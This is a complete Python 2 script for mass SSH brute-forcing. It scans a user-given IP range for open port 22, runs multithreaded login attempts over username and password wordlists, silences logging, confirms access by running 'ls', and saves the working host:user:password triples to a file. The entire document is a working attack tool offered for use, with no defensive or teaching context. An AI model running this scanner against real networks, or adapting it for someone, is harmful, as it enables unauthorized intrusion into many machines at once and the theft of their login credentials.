#!/usr/bin/env python
# -*- coding: utf-8 -*-

import threading
import paramiko
import socket
import time
import sys

paramiko.util.log_to_file('/dev/null')
start_time = None
current_host = None
hosts_scanned = 0
found = []
usernames = []
passwords = []
units = [1 << (8 * i) for i in range(3, -1, -1)]

def ip_to_int(ip):
    return sum(int(byte) * unit for (byte, unit) in zip(ip.split('.'), units))

def int_to_ip(i):
    return '.'.join(str((i / bit) & 0xff) for bit in units)

def update_stats():
    sys.stdout.write('\r|%d\t\t|%d\t\t|%d\t\t|%s.*' % (len(found), int(hosts_scanned / (time.time() - start_time)), threading.activeCount()-1, '.'.join(current_host.split('.')[0:3])))
    sys.stdout.flush()

def isPortOpen(host, port, timeout):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        if result == 0:
            return True
        else:
            return False
    except:
        return False

def brute_force(host, timeout, semaphore_object):
    global found
    global current_host
    global hosts_scanned
    current_host = host
    if isPortOpen(host, 22, timeout):
        for username in usernames:
            for password in passwords:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, username=username, password=password, timeout=timeout)
                    ssh.exec_command('ls')
                    found.append('%s:%s:%s' % (host, username, password))
                    hosts_scanned += 1
                    update_stats()
                    semaphore_object.release()
                    return None
                except:
                    pass
        hosts_scanned += 1
        update_stats()
        semaphore_object.release()
    else:
        hosts_scanned += 1
        update_stats()
        semaphore_object.release()

def main():
    global usernames
    global passwords
    global start_time
    if len(sys.argv) < 8:
        print '[-] Usage: python %s [START-IP] [END-IP] [USERNAME-LIST] [PASSWORD-LIST] [OUTPUT-FILE] [THREADS] [TIMEOUT]' % sys.argv[0]
        sys.exit()
    with open(sys.argv[3]) as file:
        for line in file:
            usernames.append(line.strip('\n'))
    with open(sys.argv[4]) as file:
        for line in file:
            passwords.append(line.strip('\n'))
    threads = []
    semaphore = threading.BoundedSemaphore(value=int(sys.argv[6]))
    ips = (int_to_ip(i) for i in xrange(ip_to_int(sys.argv[1]), ip_to_int(sys.argv[2])))
    print 'Starting Scan...\nFound\t\tHost/s\t\tThreads\t\tCurrent'
    start_time = time.time()
    for ip in ips:
        semaphore.acquire()
        thread = threading.Thread(target=brute_force, args=(ip, float(sys.argv[7]), semaphore))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()
    print '\nWriting data to file...'
    with open(sys.argv[5], 'a') as out_file:
        for fd in found:
            out_file.write(fd + '\n')
    
if __name__ == '__main__':
    main()
